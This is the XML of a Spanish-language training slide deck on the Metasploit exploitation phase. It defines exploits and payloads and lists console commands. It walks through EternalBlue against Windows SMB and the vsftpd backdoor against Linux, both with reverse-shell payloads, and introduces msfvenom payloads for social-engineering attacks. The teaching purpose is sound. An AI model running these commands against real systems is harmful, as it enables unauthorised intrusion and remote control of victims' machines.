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8" r:id="rId6"/>
    <p:sldId id="263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</p:sldIdLst>
  <p:sldSz cx="12188825" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:defaultTextStyle>
    <a:defPPr rtl="0">
      <a:defRPr lang="es-e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6395" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="113" d="100"/>
          <a:sy n="113" d="100"/>
        </p:scale>
        <p:origin x="101" y="4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478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8F1D84B-F747-4821-8617-FBD61E8F4308}" type="datetime1">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>28/09/2025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es-ES" smtClean="0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A87C823-BB9F-45DA-99AB-416A32E1B948}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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es-ES" noProof="0" smtClean="0"/>
              <a:pPr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867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451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37636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c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íne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b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0" name="Forma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2" name="Marcador de posición de fech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042E67D-14C0-4ED9-A218-9C14494A6A84}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Marcador de posición de pie de pá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4" name="Marcador de posición de número de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2E48AAE-5AE8-418A-A225-B506C222F2F9}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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c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c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A1D35CA-82F5-4AD4-B9EC-66E805B73542}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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4CCE92-710B-4678-B1B1-EFCAA5CDF075}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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FB0F2C-25D9-4D7E-B43A-29A2E16C960D}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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D34687D-B11B-47A5-95F6-B79DA932A6DF}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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3C656DE-1E46-4450-9484-A739B4FADFBC}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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EA77F8B-D469-4ECD-B91E-3B01AD692331}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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9BA7B1C-709E-4257-93A5-EC2F0807D42F}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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0A1DB83-C382-4684-8887-65A03EA4FFF0}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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60E81D3-9B82-44CA-B1F9-FCEFDC87935B}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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íneas a la izqui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b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4" name="Forma lib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83AD5-F5AF-4BDC-901E-85A05CCFFAAA}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>28/09/2025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/>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Subtítulo 4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Fase de explotación </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="What Is Metasploit | Tools &amp; Components Explained | Imperva">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{524D6F0F-DB84-4033-23CD-3A3677491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57"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5484971" y="584200"/>
            <a:ext cx="6010041" cy="558800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Título y diseño de contenido con lista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s-MX" b="1" dirty="0"/>
              <a:t>Conceptos Fundamentales</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>Vulnerabilidad:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> Una debilidad en el código o configuración (Ej. un puerto sin parchear).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0" err="1"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> El código diseñado para aprovechar esa debilidad. Es la "llave".</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0" err="1"/>
              <a:t>Payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> El código malicioso que se ejecuta una vez que el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> tiene éxito. Es la "carga" de la llave (Ej. la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> de comandos).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B2D54DA-8976-A42E-FEFC-C791D64E3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667124"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1701924" y="1484784"/>
          <a:ext cx="7546131" cy="4462463"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2515377">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1232195381"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2515377">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="265719871"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2515377">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4283298609"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="33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/>
                        <a:t>Comando</a:t>
                      </a:r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/>
                        <a:t>Función</a:t>
                      </a:r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/>
                        <a:t>Ejemplo</a:t>
                      </a:r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766581"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="59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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>search</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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/>
                        <a:t>Busca módulos por nombre o CVE.</a:t>
                      </a:r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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>search eternalblue</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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461683"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1132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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>use</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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Carga un módulo para trabajar con él.</a:t>
                      </a:r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use exploit/windows/smb/ms17_010_eternalblue</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1700"/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436135"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="59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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>show options</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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Muestra los parámetros obligatorios del módulo.</a:t>
                      </a:r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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>show options</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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165539"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="599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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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Configura un valor (IP, puerto, etc.).</a:t>
                      </a:r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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set RHOSTS 192.168.1.20</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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652059"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="865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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>show payloads</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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Muestra los payloads compatibles con el exploit actual.</a:t>
                      </a:r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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>show payloads</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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700893"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="33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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>run</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1700" b="1"/>
                        <a:t> / </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1700" b="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>exploit</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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/>
                        <a:t>Ejecuta el módulo.</a:t>
                      </a:r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 err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>exploit</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="66604" marR="66604" marT="33302" marB="33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68473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F8260AE1-12E7-FF63-1CA3-C4933A394ADB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2710036" y="413363"/>
            <a:ext cx="6112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Comandos Esenciales</a:t>
            </a:r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C946BB6-4C06-3A84-0DEE-68C6A1DE218D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2782044" y="548680"/>
            <a:ext cx="6112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Explotación Directa (Ataque al Servicio)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3C16C7C-9F63-4530-9016-ED57070EEB71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="981844" y="1124744"/>
            <a:ext cx="61129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Este método se usa cuando se detecta un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>servicio de red vulnerable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> (Ej. un servidor web o un servicio para compartir archivos).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A34CE73-7597-40F6-2D88-7557FFC4CAC1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909836" y="2468385"/>
            <a:ext cx="61129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Descubrimiento: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> (-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>) identifica un servicio (Ej. Puerto 445 SMB) y su versión. Selección: Se elige un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> que ataque ese servicio. Inyección: El </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> envía código malicioso al servicio, forzándolo a ejecutar el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> y devolver una conexión.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122CB9-0E31-F296-1CE0-9B48E736AA94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5590356" y="4771960"/>
            <a:ext cx="61129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Parámetros Clave RHOSTS: La dirección IP del sistema víctima. LHOST: Tu dirección IP (la máquina atacante que recibirá la conexión).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="336118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2B89A95-AAB6-3E2F-7CD6-365171D1F889}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2566020" y="332656"/>
            <a:ext cx="6112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Ejemplo: Explotación Directa a Windows (SMB)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C83690-B963-F022-34A0-B183E730ED97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837828" y="1010345"/>
            <a:ext cx="61129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Objetivo: Obtener una </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> en un sistema Windows vulnerable.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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F9FF92C-AFED-10E4-4D44-29048950E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328183"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="3718148" y="1700808"/>
          <a:ext cx="7704855" cy="4511451"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2568285">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1507897853"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2568285">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1317129481"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2568285">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3384344799"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="318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/>
                        <a:t>Acción</a:t>
                      </a:r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/>
                        <a:t>Comando Metasploit</a:t>
                      </a:r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/>
                        <a:t>Explicación</a:t>
                      </a:r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994542"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1083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/>
                        <a:t>1. Cargar Exploit</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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use exploit/windows/smb/ms17_010_eternalblue</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1700"/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El exploit más famoso para atacar el servicio SMB (puerto 445).</a:t>
                      </a:r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728120"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1083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/>
                        <a:t>2. Configurar Payload</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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set payload windows/x64/meterpreter/reverse_tcp</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1700"/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Se selecciona Meterpreter (el más avanzado) y se pide una </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" b="1"/>
                        <a:t>conexión inversa</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700"/>
                        <a:t>.</a:t>
                      </a:r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947336"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="573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/>
                        <a:t>3. Configurar IPs</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set RHOSTS 192.168.1.20</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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IP de la máquina Windows objetivo.</a:t>
                      </a:r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27797"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="573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/>
                        <a:t>4. Configurar IPs</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set LHOST 192.168.1.10</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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Tu IP (atacante) para escuchar la conexión.</a:t>
                      </a:r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254099"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="828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/>
                        <a:t>5. Ejecutar</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>run</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1700"/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dirty="0"/>
                        <a:t>Se lanza el </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" dirty="0" err="1"/>
                        <a:t>exploit</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" dirty="0"/>
                        <a:t>. Si es exitoso: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" b="1" dirty="0" err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>Meterpreter</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" b="1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s-MX" sz="1700" b="1" dirty="0" err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>session</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" b="1" dirty="0">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> 1 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" b="1" dirty="0" err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>opened</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1700" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="63749" marR="63749" marT="31875" marB="31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332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56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DAD3B4C-87BC-9BBC-E692-33BCB2227B9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3214092" y="476672"/>
            <a:ext cx="6112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Explotación Directa a Linux (FTP o Web)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F7597B0-7322-4995-6B57-5FA0FB8E628C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1197868" y="1124744"/>
            <a:ext cx="61129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Obtener una </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> en un sistema Linux vulnerable.</a:t>
            </a:r>
            <a:endParaRPr lang="es-CL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50C6755-0F1C-1D92-9D6F-15E879D91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908704"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="3330490" y="1772816"/>
          <a:ext cx="8164521" cy="4505012"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2721507">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="7824873"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2721507">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1852958796"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2721507">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="822538642"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="338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/>
                        <a:t>Acción</a:t>
                      </a:r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/>
                        <a:t>Comando Metasploit</a:t>
                      </a:r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/>
                        <a:t>Explicación</a:t>
                      </a:r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811321"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1149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 b="1"/>
                        <a:t>1. Cargar Exploit</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>use exploit/unix/ftp/vsftpd_234_backdoor</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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Exploit común contra el servicio VSFTPD. (Si fuera Apache, sería un exploit web).</a:t>
                      </a:r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669173"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="608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 b="1"/>
                        <a:t>2. Configurar Payload</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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set payload cmd/unix/reverse</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800"/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/>
                        <a:t>Se utiliza una shell simple de comandos de Linux.</a:t>
                      </a:r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314613"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="608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 b="1"/>
                        <a:t>3. Configurar IPs</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set RHOSTS 192.168.1.30</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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IP de la máquina Linux objetivo.</a:t>
                      </a:r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215340"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="608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 b="1"/>
                        <a:t>4. Configurar IPs</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>set LHOST 192.168.1.10</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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Tu IP para recibir la conexión.</a:t>
                      </a:r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533683"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1149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 b="1"/>
                        <a:t>5. Ejecutar</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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>
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>exploit</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1800"/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Se lanza el </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" dirty="0" err="1"/>
                        <a:t>exploit</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" dirty="0"/>
                        <a:t>. Si es exitoso: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" b="1" dirty="0" err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>Command</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" b="1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s-MX" sz="1800" b="1" dirty="0" err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>shell</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" b="1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s-MX" sz="1800" b="1" dirty="0" err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>session</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" b="1" dirty="0">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> 1 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" b="1" dirty="0" err="1">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>opened</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="67613" marR="67613" marT="33807" marB="338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45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88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7CDA9BD-C0C4-7CA1-A7E8-8CD06FF2F408}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3142084" y="404664"/>
            <a:ext cx="6112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Creación de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>Payloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>Standalone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5CF2873-E800-D61C-66C7-5B09EDCFB447}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909836" y="908720"/>
            <a:ext cx="108732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msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> es la herramienta clave para crear archivos ejecutables que contienen solo el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> (sin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>) para usar en ataques de Ingeniería Social.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DFEB23D-8D89-27FE-EA30-94CCDC75A2D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
